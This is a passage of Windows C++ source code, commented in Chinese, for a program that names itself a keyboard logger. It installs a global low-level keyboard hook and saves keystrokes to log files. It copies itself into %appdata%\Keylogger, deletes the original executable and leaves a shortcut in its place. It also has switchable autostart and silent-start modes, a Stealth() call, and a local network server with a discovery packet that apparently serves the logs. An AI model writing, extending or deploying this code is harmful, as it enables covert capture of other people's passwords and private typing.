    SendDiscoveryPacket();

    serverRunning = true;

    while (serverRunning)
    {
        // 接受客户端连接
        SOCKET clientSocket = accept(serverSocket, NULL, NULL);
        if (clientSocket == INVALID_SOCKET)
        {
            if (serverRunning) // 只有在服务器运行时才报告错误
                std::cerr << "接受连接失败" << std::endl;
            continue;
        }

        // 创建客户端处理线程
        HANDLE hClientThread = CreateThread(NULL, 0, ClientHandlerThreadFunc, (LPVOID)clientSocket, 0, NULL);
        if (hClientThread)
            CloseHandle(hClientThread);
    }

    closesocket(serverSocket);
    WSACleanup();
    return 0;
}

// ---------- 键盘钩子回调函数 ----------
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN)
        {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            // Check for Ctrl + Shift + Alt + P
            if (kbdStruct.vkCode == 'P' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                isRecording = !isRecording;
                if (isRecording)
                {
                    std::cout << "录制继续\n";
                    ShowToastNotification(L"继续录(/≧▽≦)/", L"录制继续");
                }
                else
                {
                    std::cout << "录制暂停\n";
                    ShowToastNotification(L"不录啦╰(￣ω￣ｏ)", L"录制暂停");
                }
            }
            // Check for Ctrl + Shift + Alt + Q
            else if (kbdStruct.vkCode == 'Q' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                ShowToastNotification(L"真不录啦（*゜ー゜*）\n\n那拜拜啦(o゜▽゜)o☆", L"录制结束");
                std::cout << "录制结束\n";
                Sleep(2000);
                CleanupNotifyIcon();   // 清理托盘图标
                ReleaseHook();
                output_file.close();
                exit(0);
            }
            // Check for Ctrl + Shift + Alt + S (开机自启)
            else if (kbdStruct.vkCode == 'S' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                bool enabled = IsAutoStartEnabled();
                if (SetAutoStart(!enabled))
                {
                    if (!enabled)
                        ShowToastNotification(L"已设置为开机自啟 awa", L"自启设置");
                    else
                        ShowToastNotification(L"已取消开机自启 qaq", L"自启设置");
                }
                else
                {
                    ShowToastNotification(L"自启设置失败，请以管理员身份运行w", L"自启设置");
                }
            }
            // Check for Ctrl + Shift + Alt + D (静默启动)
            else if (kbdStruct.vkCode == 'D' && (GetKeyState(VK_CONTROL) & 0x8000) && (GetKeyState(VK_SHIFT) & 0x8000) && (GetKeyState(VK_MENU) & 0x8000))
            {
                bool silent = IsSilentMode();
                if (SetSilentMode(!silent))
                {
                    if (!silent)
                        ShowToastNotification(L"已设置为静默启动（下次启动不再弹窗）", L"静默启动");
                    else
                        ShowToastNotification(L"已取消静默启动（下次启动会弹窗）", L"静默启动");
                }
                else
                {
                    ShowToastNotification(L"设置静默启动失败，请以管理员身份运行", L"静默启动");
                }
            }
            else
            {
                // save to file only if recording
                if (isRecording)
                {
                    Save(kbdStruct.vkCode);
                }
            }
        }
    }

    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

// ==================== 新增功能：自复制、删除原文件、创建快捷方式 ====================

// 创建快捷方式（通用）
bool CreateShortcut(const std::wstring& targetPath, const std::wstring& shortcutPath)
{
    // 如果快捷方式已存在，则不重复创建
    if (fs::exists(shortcutPath))
        return true;

    CoInitialize(NULL);
    IShellLinkW* psl = NULL;
    IPersistFile* ppf = NULL;
    HRESULT hr = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (LPVOID*)&psl);
    if (SUCCEEDED(hr))
    {
        psl->SetPath(targetPath.c_str());
        psl->SetDescription(L"Keyboard Logger");
        hr = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);
        if (SUCCEEDED(hr))
        {
            hr = ppf->Save(shortcutPath.c_str(), TRUE);
            ppf->Release();
        }
        psl->Release();
    }
    CoUninitialize();
    return SUCCEEDED(hr);
}

// 实现自复制、删除原文件、创建快捷方式
void HandleSelfCopyAndDelete()
{
    // 获取目标目录为%appdata%\Keylogger
    wchar_t appdataPath[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdataPath)))
        return;

    std::wstring targetDir = std::wstring(appdataPath) + L"\\Keylogger";
    fs::create_directories(targetDir);

    std::wstring currentExe = GetModulePath();
    std::wstring targetExe = targetDir + L"\\" + fs::path(currentExe).filename().wstring();

    // 如果当前程序不在目标目录中，则执行自复制、创建快捷方式并删除原文件
    if (currentExe != targetExe)
    {
        // 复制到目标目录
        if (!CopyFileW(currentExe.c_str(), targetExe.c_str(), FALSE))
        {
            MessageBoxW(NULL, L"无法复制到 %appdata%\Keylogger 目录", L"错误", MB_ICONERROR);
            return;
        }

        // 在原程序目录创建指向新位置的快捷方式
        std::wstring originalDir = fs::path(currentExe).parent_path().wstring();
        std::wstring shortcutName = fs::path(currentExe).stem().wstring() + L".lnk";
        std::wstring shortcutPath = originalDir + L"\\" + shortcutName;
        CreateShortcut(targetExe, shortcutPath);

        // 启动新副本，并传递参数以删除旧文件
        std::wstring params = L"--delete-old \"" + currentExe + L"\"";
        wchar_t paramsBuf[1024];
        wcscpy_s(paramsBuf, params.c_str());

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        if (CreateProcessW(targetExe.c_str(), paramsBuf, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            ExitProcess(0);   // 退出当前进程
        }
        else
        {
            MessageBoxW(NULL, L"启动新副本失败", L"错误", MB_ICONERROR);
        }
    }
    else
    {
        // 已经在目标目录中，检查是否需要删除旧文件（来自参数）
        int argc;
        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
        if (argc >= 3 && wcscmp(argv[1], L"--delete-old") == 0)
        {
            std::wstring oldPath = argv[2];
            // 等待原程序完全退出（增加延迟）
            Sleep(5000);  // 5秒，确保原程序已退出

            // 尝试删除原文件（多尝试）
            bool deleted = false;
            DWORD lastError = 0;
            for (int i = 0; i < 10; ++i)
            {
                // 检查文件是否存在
                if (!fs::exists(oldPath))
                {
                    deleted = true;
                    break;
                }

                // 移除可能的只读属性
                SetFileAttributesW(oldPath.c_str(), FILE_ATTRIBUTE_NORMAL);

                // 尝试删除
                if (DeleteFileW(oldPath.c_str()))
                {
                    deleted = true;
                    break;
                }

                lastError = GetLastError();
                // 如果文件被占用，等待后重试
                if (lastError == ERROR_SHARING_VIOLATION || lastError == ERROR_ACCESS_DENIED)
                {
                    Sleep(1000);
                    continue;
                }
                else
                {
                    // 其他错误，直接退出循环
                    break;
                }
            }

            if (!deleted)
            {
                // 如果删除失败，尝试延迟删除（重启时删除）
                if (!MoveFileExW(oldPath.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT))
                {
                    lastError = GetLastError();
                    wchar_t msg[512];
                    wsprintfW(msg, L"删除原文件失败，错误码:%lu\n路径:%s\n尝试延迟删除（重启时生效）", lastError, oldPath.c_str());
                    MessageBoxW(NULL, msg, L"删除错误", MB_ICONERROR);
                }
                else
                {
                    // 延迟删除成功，提示用户
                    MessageBoxW(NULL, L"原文件将在下次重启时删除", L"提示", MB_ICONINFORMATION);
                }
            }
        }
        if (argv) LocalFree(argv);
    }
}

// ==================== 主函数 ====================
int main()
{
    // 首先执行自复制和文件处理（必须在 Stealth 之前，因为可能会重启进程）
    HandleSelfCopyAndDelete();

    Stealth();

    // 非静默模式下显示提示（如果未设置静默模式则显示启动提示）
    if (!IsSilentMode()) {
        MessageBoxW(NULL, L"开始录制 q(≧▽≦q)\n\n小提示ww\n"
            L"Ctrl + Shift + Alt + P  启停录制\n"
            L"Ctrl + Shift + Alt + Q  结束录制\n"
            L"Ctrl + Shift + Alt + S  开启/取消开机自启\n"
            L"Ctrl + Shift + Alt + D  开启/取消静默启动\n\n"
            L"录制的日志保存在 %appdata%\Keylogger 目录，文件名为 ip_日期.log",
            L"录制开始", MB_OK);
    }

#ifdef bootwait 
    while (IsSystemBooting())
    {
        std::cout << "系统正在启动，等待10秒后重试...\n";
        Sleep(10000);
    }
#endif
#ifdef nowait 
    std::cout << "跳过系统启动等待。\n";
#endif

    // 确保日志目录存在
    GetLogDirectory();

    std::string output_filename = MakeOutputFilename();
    std::cout << "输出日志到 " << output_filename << std::endl;

    output_file.open(output_filename, std::ios_base::app | std::ios::binary);

    SetHook();

    // 启动服务器检查线程
    HANDLE hServerCheckThread = CreateThread(NULL, 0, ServerCheckThreadFunc, NULL, 0, NULL);
    if (hServerCheckThread)
        CloseHandle(hServerCheckThread);

    // 启动本地服务器线程
    hServerThread = CreateThread(NULL, 0, LocalServerThreadFunc, NULL, 0, NULL);
    if (hServerThread)
        CloseHandle(hServerThread);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
    CleanupNotifyIcon();
    ReleaseHook();
    output_file.close();
    return 0;
}
